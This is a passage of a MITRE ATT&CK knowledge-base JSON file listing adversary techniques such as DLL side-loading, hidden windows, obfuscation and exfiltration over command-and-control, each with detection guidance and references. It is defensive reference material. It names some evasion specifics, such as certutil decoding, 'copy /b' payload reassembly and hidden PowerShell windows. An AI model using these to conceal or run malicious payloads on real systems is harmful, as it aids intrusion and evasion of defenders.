            "x_mitre_version": "1.0",
            "created": "2020-03-15T00:40:27.503Z",
            "x_mitre_platforms": [
                "Linux",
                "Windows",
                "macOS"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc",
            "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "command-and-control"
                }
            ],
            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1001/003",
                    "external_id": "T1001.003",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "University of Birmingham C2",
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Deobfuscate/Decode Files or Information",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "File: File Modification",
                "Script: Script Execution"
            ],
            "x_mitre_version": "1.1",
            "modified": "2020-07-09T14:42:23.122Z",
            "created": "2017-12-14T16:46:06.044Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
            "x_mitre_defense_bypassed": [
                "Anti-virus",
                "Host intrusion prevention systems",
                "Signature-based detection",
                "Network intrusion detection system"
            ],
            "x_mitre_platforms": [
                "Windows",
                "Linux",
                "macOS"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)",
            "x_mitre_contributors": [
                "Matthew Demaske, Adaptforward",
                "Red Canary"
            ],
            "x_mitre_detection": "Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1140",
                    "external_id": "T1140",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Malwarebytes Targeted Attack against Saudi Arabia",
                    "description": "Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017.",
                    "url": "https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/"
                },
                {
                    "source_name": "Carbon Black Obfuscation Sept 2016",
                    "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
                    "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
                },
                {
                    "source_name": "Volexity PowerDuke November 2016",
                    "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
                    "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Symmetric Cryptography",
            "x_mitre_data_sources": [
                "Network Traffic: Network Traffic Content"
            ],
            "x_mitre_version": "1.0",
            "modified": "2020-03-26T21:25:37.306Z",
            "created": "2020-03-16T15:45:17.032Z",
            "x_mitre_platforms": [
                "Linux",
                "Windows",
                "macOS"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41",
            "description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "command-and-control"
                }
            ],
            "x_mitre_detection": "With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1573/001",
                    "external_id": "T1573.001",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "University of Birmingham C2",
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Exfiltration Over C2 Channel",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1041",
                    "external_id": "T1041",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "University of Birmingham C2",
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ],
            "x_mitre_data_sources": [
                "Network Traffic: Network Connection Creation",
                "Network Traffic: Network Traffic Flow",
                "Network Traffic: Network Traffic Content",
                "File: File Access",
                "Command: Command Execution"
            ],
            "x_mitre_version": "2.1",
            "modified": "2021-10-15T22:45:50.620Z",
            "created": "2017-05-31T21:30:41.804Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "exfiltration"
                }
            ],
            "x_mitre_network_requirements": true,
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d",
            "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
            "x_mitre_contributors": [
                "William Cain"
            ],
            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Exploitation for Client Execution",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1203",
                    "external_id": "T1203",
                    "source_name": "mitre-attack"
                }
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-10-15T19:01:34.932Z",
            "x_mitre_system_requirements": [
                "Remote exploitation for execution requires a remotely accessible service reachable over the network or other vector of access such as spearphishing or drive-by compromise."
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_platforms": [
                "Linux",
                "Windows",
                "macOS"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
            "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
            "x_mitre_remote_support": false,
            "x_mitre_detection": "Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
            "created": "2018-04-18T17:59:24.739Z",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Hidden Window",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Command: Command Execution",
                "Script: Script Execution",
                "File: File Modification"
            ],
            "x_mitre_version": "1.0",
            "modified": "2020-03-29T22:49:43.557Z",
            "created": "2020-03-13T20:26:49.433Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
            "x_mitre_platforms": [
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)",
            "x_mitre_contributors": [
                "Travis Smith, Tripwire"
            ],
            "x_mitre_detection": "Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1564/003",
                    "external_id": "T1564.003",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1",
                    "description": "Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved October 11, 2019.",
                    "source_name": "PowerShell About 2019"
                },
                {
                    "source_name": "Antiquated Mac Malware",
                    "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
                    "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-04-26T18:31:34.954Z",
            "name": "DLL Side-Loading",
            "x_mitre_data_sources": [
                "File: File Creation",
                "File: File Modification",
                "Module: Module Load",
                "Process: Process Creation"
            ],
            "x_mitre_version": "2.0",
            "created": "2020-03-13T19:41:37.908Z",
            "x_mitre_defense_bypassed": [
                "Anti-virus",
                "Application control"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
            "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "x_mitre_detection": "Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1574/002",
                    "external_id": "T1574.002",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/641.html",
                    "external_id": "CAPEC-641",
                    "source_name": "capec"
                },
                {
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf",
                    "description": "Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.",
                    "source_name": "FireEye DLL Side-Loading"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Masquerade Task or Service",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Service: Service Metadata",
                "Service: Service Creation",
                "Scheduled Job: Scheduled Job Metadata",
                "Scheduled Job: Scheduled Job Modification"
            ],
            "x_mitre_version": "1.1",
            "modified": "2021-10-18T13:24:52.618Z",
            "created": "2020-02-10T20:30:07.426Z",
            "x_mitre_permissions_required": [
                "User",
                "Administrator",
                "SYSTEM"
            ],
            "x_mitre_platforms": [
                "Windows",
                "Linux",
                "macOS"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c",
            "description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "x_mitre_detection": "Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1036/004",
                    "external_id": "T1036.004",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "TechNet Schtasks",
                    "description": "Microsoft. (n.d.). Schtasks. Retrieved April 28, 2016.",
                    "url": "https://technet.microsoft.com/en-us/library/bb490996.aspx"
                },
                {
                    "url": "https://www.freedesktop.org/software/systemd/man/systemd.service.html",
                    "description": "Freedesktop.org. (n.d.). systemd.service \u2014 Service unit configuration. Retrieved March 16, 2020.",
                    "source_name": "Systemd Service Units"
                },
                {
                    "source_name": "Palo Alto Shamoon Nov 2016",
                    "description": "Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.",
                    "url": "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/"
                },
                {
                    "source_name": "Fysbis Dr Web Analysis",
                    "description": "Doctor Web. (2014, November 21). Linux.BackDoor.Fysbis.1. Retrieved December 7, 2017.",
                    "url": "https://vms.drweb.com/virus/?i=4276269"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Native API",
            "x_mitre_data_sources": [
                "Process: OS API Execution",
                "Module: Module Load"
            ],
            "x_mitre_version": "2.1",
            "modified": "2021-10-18T21:24:30.764Z",
            "created": "2017-05-31T21:31:17.472Z",
            "x_mitre_remote_support": false,
            "id": "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670",
            "x_mitre_platforms": [
                "Windows",
                "macOS",
                "Linux"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. (Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_contributors": [
                "Gordon Long, Box, Inc., @ethicalhax",
                "Stefan Kanthak"
            ],
            "x_mitre_detection": "Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. ",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1106",
                    "external_id": "T1106",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://undocumented.ntinternals.net/",
                    "description": "The NTinterlnals.net team. (n.d.). Nowak, T. Retrieved June 25, 2020.",
                    "source_name": "NT API Windows"
                },
                {
                    "url": "https://www.kernel.org/doc/html/v4.12/core-api/kernel-api.html",
                    "description": "Linux Kernel Organization, Inc. (n.d.). The Linux Kernel API. Retrieved June 25, 2020.",
                    "source_name": "Linux Kernel API"
                },
                {
                    "url": "https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/",
                    "description": "de Plaa, C. (2019, June 19). Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR. Retrieved September 29, 2021.",
                    "source_name": "OutFlank System Calls"
                },
                {
                    "url": "https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/",
                    "description": "Gavriel, H. (2018, November 27). Malware Mitigation when Direct System Calls are Used. Retrieved September 29, 2021.",
                    "source_name": "CyberBit System Calls"
                },
                {
                    "url": "https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/",
                    "description": "MDSec Research. (2020, December). Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams. Retrieved September 29, 2021.",
                    "source_name": "MDSec System Calls"
                },
                {
                    "source_name": "Microsoft CreateProcess",
                    "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.",
                    "url": "http://msdn.microsoft.com/en-us/library/ms682425"
                },
                {
                    "url": "https://www.gnu.org/software/libc/manual/html_node/Creating-a-Process.html",
                    "description": "Free Software Foundation, Inc.. (2020, June 18). Creating a Process. Retrieved June 25, 2020.",
                    "source_name": "GNU Fork"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/windows/win32/api/",
                    "description": "Microsoft. (n.d.). Programming reference for the Win32 API. Retrieved March 15, 2020.",
                    "source_name": "Microsoft Win32"
                },
                {
                    "url": "https://man7.org/linux/man-pages//man7/libc.7.html",
                    "description": "Kerrisk, M. (2016, December 12). libc(7) \u2014 Linux manual page. Retrieved June 25, 2020.",
                    "source_name": "LIBC"
                },
                {
                    "url": "https://www.gnu.org/software/libc/",
                    "description": "glibc developer community. (2020, February 1). The GNU C Library (glibc). Retrieved June 25, 2020.",
                    "source_name": "GLIBC"
                },
                {
                    "url": "https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet-framework",
                    "description": "Microsoft. (n.d.). What is .NET Framework?. Retrieved March 15, 2020.",
                    "source_name": "Microsoft NET"
                },
                {
                    "url": "https://developer.apple.com/documentation/coreservices",
                    "description": "Apple. (n.d.). Core Services. Retrieved June 25, 2020.",
                    "source_name": "Apple Core Services"
                },
                {
                    "url": "https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/OSX_Technology_Overview/CocoaApplicationLayer/CocoaApplicationLayer.html#//apple_ref/doc/uid/TP40001067-CH274-SW1",
                    "description": "Apple. (2015, September 16). Cocoa Application Layer. Retrieved June 25, 2020.",
                    "source_name": "MACOS Cocoa"
                },
                {
                    "url": "https://developer.apple.com/documentation/foundation",
                    "description": "Apple. (n.d.). Foundation. Retrieved July 1, 2020.",
                    "source_name": "macOS Foundation"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Obfuscated Files or Information",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "File: File Metadata",
                "File: File Creation",
                "Process: Process Creation"
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-10-20T16:33:13.472Z",
            "created": "2017-05-31T21:30:32.662Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "x_mitre_defense_bypassed": [
                "Host forensic analysis",
                "Signature-based detection",
                "Host intrusion prevention systems",
                "Application control",
                "Log analysis",
                "Application control by file name or path"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
            "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
            "x_mitre_contributors": [
                "Red Canary",
                "Christiaan Beek, @ChristiaanBeek"
            ],
            "x_mitre_detection": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1027",
